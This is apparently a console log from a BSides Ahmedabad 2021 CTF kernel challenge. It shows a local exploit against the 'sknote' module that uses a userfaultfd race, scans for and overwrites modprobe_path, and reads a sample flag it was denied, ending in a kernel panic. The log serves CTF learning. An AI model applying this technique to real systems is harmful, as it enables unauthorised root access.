[+] starting exploit localy...
c[?7l[2J[0mSeaBIOS (version 1.13.0-1ubuntu1.1)


iPXE (http://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+03F8C8B0+03ECC8B0 CA00
Press Ctrl-B to configure iPXE (PCI 00:03.0)...                                                                               


Booting from ROM..c[?7l[2JStarting syslogd: OK
Starting klogd: OK
Running sysctl: OK
Saving random seed: OK
Starting network: udhcpc: started, v1.34.0
udhcpc: broadcasting discover
udhcpc: broadcasting select for 10.0.2.15, server 10.0.2.2
udhcpc: lease of 10.0.2.15 obtained from 10.0.2.2, lease time 86400
deleting routers
adding dns 10.0.2.3
OK
Starting dhcpcd...
dhcpcd-9.4.0 starting
DUID 00:01:00:01:29:23:e2:6d:52:54:00:12:34:56
eth0: IAID 00:12:34:56
eth0: soliciting a DHCP lease
eth0: offered 10.0.2.15 from 10.0.2.2
eth0: soliciting an IPv6 router
eth0: leased 10.0.2.15 for 86400 seconds
eth0: adding route to 10.0.2.0/24
eth0: adding default route via 10.0.2.2
forked to background, child pid 114

Boot took 5.82 seconds

[ shared knote - BSides AHM 2021 ]
/ $ cat /roo/ $ cat /root/[Jexp[J[J[Jflag.txt
cat: can't open '/root/flag.txt': Permission denied
/ $ ./exp/ $ ./exploit [J
[zeropage] registering uffd-visor.
[zeropage] mmapping...
[zeropage] mmapped @ (nil) - 0x1000
[zeropage] registered uffd visor.
[zeropage] entered fault_handler_thread
[zeropage] polling...
[+] starting opener and closer...
[+] closer starting
[+] opener starting
[!zeropage] page fault @ (nil)
[zeropage] copying from 0x2525000 to faulted page.
[zeropage] exiting fault_handler_thrd
[+] opener exiting
[+] closer exiting
[.] checking race is actually achieved...
[!] found alive fd: 0
[.] searching for modprobe_path: ffffffff81000000
[.] searching for modprobe_path: ffffffff82000000
[.] searching for modprobe_path: ffffffff83000000
[.] searching for modprobe_path: ffffffff84000000
[.] searching for modprobe_path: ffffffff85000000
[.] searching for modprobe_path: ffffffff86000000
[.] searching for modprobe_path: ffffffff87000000
[.] searching for modprobe_path: ffffffff88000000
[.] searching for modprobe_path: ffffffff89000000
[.] searching for modprobe_path: ffffffff8a000000
[.] searching for modprobe_path: ffffffff8b000000
[.] searching for modprobe_path: ffffffff8c000000
[.] searching for modprobe_path: ffffffff8d000000
[.] searching for modprobe_path: ffffffff8e000000
[.] searching for modprobe_path: ffffffff8f000000
[.] searching for modprobe_path: ffffffff90000000
[.] searching for modprobe_path: ffffffff91000000
[.] searching for modprobe_path: ffffffff92000000
[.] searching for modprobe_path: ffffffff93000000
[.] searching for modprobe_path: ffffffff94000000
[.] searching for modprobe_path: ffffffff95000000
[.] searching for modprobe_path: ffffffff96000000
[.] searching for modprobe_path: ffffffff97000000
[.] searching for modprobe_path: ffffffff98000000
[.] searching for modprobe_path: ffffffff99000000
[.] searching for modprobe_path: ffffffff9a000000
[.] searching for modprobe_path: ffffffff9b000000
[.] searching for modprobe_path: ffffffff9c000000
[.] searching for modprobe_path: ffffffff9d000000
[.] searching for modprobe_path: ffffffff9e000000
[.] searching for modprobe_path: ffffffff9f000000
[.] searching for modprobe_path: ffffffffa0000000
[.] searching for modprobe_path: ffffffffa1000000
[.] searching for modprobe_path: ffffffffa2000000
[.] searching for modprobe_path: ffffffffa3000000
[.] searching for modprobe_path: ffffffffa4000000
[.] searching for modprobe_path: ffffffffa5000000
[.] searching for modprobe_path: ffffffffa6000000
[.] searching for modprobe_path: ffffffffa7000000
[.] searching for modprobe_path: ffffffffa8000000
[.] searching for modprobe_path: ffffffffa9000000
[.] searching for modprobe_path: ffffffffaa000000
[.] searching for modprobe_path: ffffffffab000000
[.] searching for modprobe_path: ffffffffac000000
[!] found modprobe_path @ 0xffffffffac8367c0
/tmp/nirugiri: line 1: ÿÿÿÿ: not found
XXXX{sample_flag}
[ ] END exploit.
BUG: kernel NULL pointer dereference, address: 0000000000000008
#PF: supervisor read access in kernel mode
#PF: error_code(0x0000) - not-present page
PGD 0 P4D 0 
Oops: 0000 [#1] PREEMPT SMP PTI
CPU: 1 PID: 173 Comm: exploit Tainted: G           O      5.14.3 #4
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
RIP: 0010:module_close+0x16/0x40 [sknote]
Code: c7 c0 ea ff ff ff eb df 48 c7 c0 f2 ff ff ff eb d6 0f 1f 00 f0 48 83 2d 17 23 00 00 01 74 03 31 c0 c3 55 48 8b 05 12 23 00 00 <48> 8b 78 08 48 89 e5 e8 2e a4 87 eb 48 8b 3d ff 22 00 00 e8 22 a4
RSP: 0018:ffffb073001c3e28 EFLAGS: 00000246
RAX: 0000000000000000 RBX: 00000000000e001f RCX: ffff8f9cc1074800
RDX: ffff8f9cc1aa1000 RSI: ffff8f9cc139bc00 RDI: ffff8f9cc1c84580
RBP: ffffb073001c3e60 R08: ffff8f9cc107ab40 R09: ffff8f9cc1c84580
R10: 0000000000000008 R11: ffff8f9cc139bc10 R12: ffff8f9cc139bc00
R13: ffff8f9cc1c84580 R14: ffff8f9cc1aa1020 R15: ffff8f9cc1441600
FS:  0000000000000000(0000) GS:ffff8f9cc2500000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 0000000000000008 CR3: 000000000340a000 CR4: 00000000000006e0
Call Trace:
 ? __fput+0x92/0x240
 ____fput+0x9/0x10
 task_work_run+0x5f/0x90
 do_exit+0x2e8/0x960
 ? handle_mm_fault+0x5d/0x180
 do_group_exit+0x36/0xa0
 __x64_sys_exit_group+0x13/0x20
 do_syscall_64+0x43/0x90
 entry_SYSCALL_64_after_hwframe+0x44/0xae
RIP: 0033:0x458b46
Code: Unable to access opcode bytes at RIP 0x458b1c.
RSP: 002b:00007ffe3bce7a38 EFLAGS: 00000246 ORIG_RAX: 00000000000000e7
RAX: ffffffffffffffda RBX: 00000000004e4770 RCX: 0000000000458b46
RDX: 0000000000000000 RSI: 000000000000003c RDI: 0000000000000000
RBP: 0000000000000000 R08: 00000000000000e7 R09: ffffffffffffffb8
R10: 0000000000000008 R11: 0000000000000246 R12: 00000000004e4770
R13: 0000000000000001 R14: 0000000000000000 R15: 0000000000000001
Modules linked in: sknote(O)
CR2: 0000000000000008
---[ end trace c663a6d1f45b1843 ]---
RIP: 0010:module_close+0x16/0x40 [sknote]
Code: c7 c0 ea ff ff ff eb df 48 c7 c0 f2 ff ff ff eb d6 0f 1f 00 f0 48 83 2d 17 23 00 00 01 74 03 31 c0 c3 55 48 8b 05 12 23 00 00 <48> 8b 78 08 48 89 e5 e8 2e a4 87 eb 48 8b 3d ff 22 00 00 e8 22 a4
RSP: 0018:ffffb073001c3e28 EFLAGS: 00000246
RAX: 0000000000000000 RBX: 00000000000e001f RCX: ffff8f9cc1074800
RDX: ffff8f9cc1aa1000 RSI: ffff8f9cc139bc00 RDI: ffff8f9cc1c84580
RBP: ffffb073001c3e60 R08: ffff8f9cc107ab40 R09: ffff8f9cc1c84580
R10: 0000000000000008 R11: ffff8f9cc139bc10 R12: ffff8f9cc139bc00
R13: ffff8f9cc1c84580 R14: ffff8f9cc1aa1020 R15: ffff8f9cc1441600
FS:  0000000000000000(0000) GS:ffff8f9cc2500000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 0000000000000008 CR3: 000000000340a000 CR4: 00000000000006e0
Kernel panic - not syncing: Fatal exception
Kernel Offset: 0x2aa00000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
